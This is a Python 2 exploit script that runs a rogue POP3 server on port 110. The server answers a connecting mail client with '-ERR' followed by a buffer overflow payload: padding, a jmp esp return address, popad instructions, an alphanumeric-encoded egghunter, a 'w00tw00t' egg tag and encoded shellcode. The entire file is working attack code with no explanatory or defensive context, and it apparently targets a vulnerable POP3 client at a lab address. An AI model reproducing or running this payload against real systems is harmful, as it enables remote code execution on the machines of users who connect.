import socket
import struct
totalbuffer = 2000
ip = "10.0.2.5"
offset = "\x41" * (724 - len(ip))
print "length of offset :" + str(len(offset))
# jmp esp at 0x7e429353
eip = struct.pack('<I',0x7e429353)

# put encoded egghunter (decoder) after jmp esp 
# add some popad to make ESP point below the encoded hunter
# for every popad, esp = esp + 32 (pop all registers = edi,esi,ebp,esp,ebx,edx,ecx,eax)
popad = "\x61\x61\x61\x61\x61\x61\x61\x61" #32*8 popad > length of egghunter (put esp before egghunter)
encodedegghunter = ("\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x30\x71\x55\x71"   #x75 xE7 xFF xE7
"\x2d\x30\x71\x55\x71"
"\x2d\x2B\x36\x55\x35"
"\x50"                   #push eax
#--------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x71\x30\x71\x71"   #xAF x75 xEA xAF
"\x2d\x71\x30\x71\x71"
"\x2d\x6F\x29\x33\x6D"
"\x50"                   #push eax
#--------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x50\x30\x25\x65"   #x30 x74 x8B xFA
"\x2d\x50\x30\x25\x65"
"\x2d\x30\x2B\x2A\x3B"
"\x50"                   #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x71\x71\x30\x41"   #xEF xB8 x77 x30
"\x2d\x71\x71\x30\x41"
"\x2d\x2F\x64\x27\x4d"
"\x50"                   #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x42\x53\x30\x30"   #x3C x05 x5A x74
"\x2d\x41\x53\x30\x30"
"\x2d\x41\x54\x45\x2B"
"\x50"                   #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x54\x30\x66\x46"   #x02 x58 xCD x2E
"\x2d\x55\x30\x66\x46"
"\x2d\x55\x47\x66\x44"
"\x50"                   #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x50\x3e\x39\x31"   #x0F x42 x52 x6A
"\x2d\x50\x3e\x39\x32"
"\x2d\x51\x41\x3b\x32"
"\x50"                   #push eax
#----------------------------
"\x25\x4A\x4D\x4E\x55"   #zero eax
"\x25\x35\x32\x31\x2A"   #
"\x2d\x33\x35\x70\x55"   #x66 x81 xCA xFF
"\x2d\x33\x25\x70\x55"
"\x2d\x34\x24\x55\x55"
"\x50"                   #push eax
#------------------------------
"\x41\x41\x41\x41")       #some nops


padding = "\x90" * 1000

woot = "w00tw00t"

shellcode = ("\x89\xe7\xd9\xc5\xd9\x77\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x59"
"\x6c\x78\x68\x4b\x32\x75\x50\x75\x50\x65\x50\x73\x50\x4f\x79"
"\x4d\x35\x46\x51\x4b\x70\x51\x74\x4c\x4b\x36\x30\x76\x50\x4c"
"\x4b\x70\x52\x56\x6c\x4e\x6b\x71\x42\x45\x44\x4c\x4b\x53\x42"
"\x74\x68\x76\x6f\x38\x37\x51\x5a\x77\x56\x56\x51\x39\x6f\x6c"
"\x6c\x45\x6c\x65\x31\x61\x6c\x36\x62\x56\x4c\x45\x70\x69\x51"
"\x7a\x6f\x34\x4d\x46\x61\x5a\x67\x4b\x52\x4c\x32\x30\x52\x72"
"\x77\x4e\x6b\x42\x72\x36\x70\x6e\x6b\x30\x4a\x57\x4c\x4e\x6b"
"\x52\x6c\x54\x51\x54\x38\x49\x73\x50\x48\x67\x71\x7a\x71\x56"
"\x31\x6c\x4b\x43\x69\x65\x70\x45\x51\x48\x53\x6e\x6b\x61\x59"
"\x44\x58\x4d\x33\x34\x7a\x42\x69\x6c\x4b\x55\x64\x6c\x4b\x47"
"\x71\x7a\x76\x36\x51\x69\x6f\x6c\x6c\x4b\x71\x38\x4f\x76\x6d"
"\x45\x51\x5a\x67\x55\x68\x79\x70\x62\x55\x7a\x56\x77\x73\x53"
"\x4d\x6c\x38\x65\x6b\x73\x4d\x65\x74\x51\x65\x4d\x34\x52\x78"
"\x6c\x4b\x32\x78\x65\x74\x57\x71\x39\x43\x55\x36\x4e\x6b\x56"
"\x6c\x62\x6b\x6c\x4b\x31\x48\x47\x6c\x37\x71\x79\x43\x4c\x4b"
"\x64\x44\x4e\x6b\x55\x51\x4e\x30\x4f\x79\x61\x54\x71\x34\x76"
"\x44\x43\x6b\x31\x4b\x65\x31\x51\x49\x72\x7a\x56\x31\x59\x6f"
"\x4b\x50\x61\x4f\x43\x6f\x71\x4a\x4c\x4b\x57\x62\x78\x6b\x6c"
"\x4d\x63\x6d\x55\x38\x70\x33\x47\x42\x35\x50\x63\x30\x50\x68"
"\x51\x67\x50\x73\x36\x52\x53\x6f\x52\x74\x42\x48\x50\x4c\x42"
"\x57\x54\x66\x47\x77\x69\x6f\x38\x55\x6f\x48\x6e\x70\x37\x71"
"\x35\x50\x45\x50\x71\x39\x79\x54\x46\x34\x70\x50\x62\x48\x37"
"\x59\x6b\x30\x32\x4b\x77\x70\x69\x6f\x6a\x75\x36\x30\x70\x50"
"\x52\x70\x52\x70\x53\x70\x76\x30\x43\x70\x72\x70\x63\x58\x68"
"\x6a\x54\x4f\x39\x4f\x59\x70\x79\x6f\x48\x55\x4d\x47\x61\x7a"
"\x43\x35\x33\x58\x37\x7a\x65\x50\x75\x52\x74\x45\x63\x58\x63"
"\x32\x47\x70\x53\x31\x4f\x4b\x6c\x49\x79\x76\x52\x4a\x62\x30"
"\x42\x76\x32\x77\x33\x58\x4c\x59\x59\x35\x33\x44\x45\x31\x6b"
"\x4f\x6b\x65\x6e\x65\x4b\x70\x33\x44\x46\x6c\x69\x6f\x42\x6e"
"\x33\x38\x72\x55\x38\x6c\x52\x48\x5a\x50\x48\x35\x4f\x52\x61"
"\x46\x6b\x4f\x68\x55\x70\x68\x52\x43\x70\x6d\x65\x34\x37\x70"
"\x6e\x69\x5a\x43\x61\x47\x52\x77\x50\x57\x75\x61\x78\x76\x32"
"\x4a\x65\x42\x73\x69\x52\x76\x4a\x42\x6b\x4d\x50\x66\x59\x57"
"\x73\x74\x76\x44\x35\x6c\x75\x51\x76\x61\x6c\x4d\x33\x74\x44"
"\x64\x34\x50\x78\x46\x73\x30\x62\x64\x71\x44\x36\x30\x36\x36"
"\x42\x76\x62\x76\x31\x56\x56\x36\x32\x6e\x62\x76\x32\x76\x72"
"\x73\x36\x36\x42\x48\x44\x39\x7a\x6c\x57\x4f\x6e\x66\x39\x6f"
"\x79\x45\x6f\x79\x39\x70\x62\x6e\x52\x76\x47\x36\x59\x6f\x50"
"\x30\x75\x38\x47\x78\x4c\x47\x55\x4d\x65\x30\x4b\x4f\x68\x55"
"\x6d\x6b\x6a\x50\x4d\x65\x39\x32\x61\x46\x73\x58\x4f\x56\x5a"
"\x35\x6f\x4d\x4f\x6d\x4b\x4f\x39\x45\x35\x6c\x73\x36\x51\x6c"
"\x34\x4a\x6b\x30\x6b\x4b\x79\x70\x34\x35\x53\x35\x6f\x4b\x67"
"\x37\x44\x53\x53\x42\x50\x6f\x43\x5a\x33\x30\x46\x33\x59\x6f"
"\x6e\x35\x41\x41")
#junk = "\x43" * (totalbuffer - len(offset) - len(eip) - len(egghunter) - len(padding) - len(woot) - len(shellcode))

payload = offset + eip + popad +  encodedegghunter + padding + woot + shellcode
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('',110))
	s.listen(1)
	print '[*] Listener is up on port 110'
	conn, addr = s.accept()

	while 1:
		print '[*] Sending buffer '
		conn.send('-ERR'+payload)
	conn.close()
except:
	print '[*] idk what happened, maybe your code just sucks...'
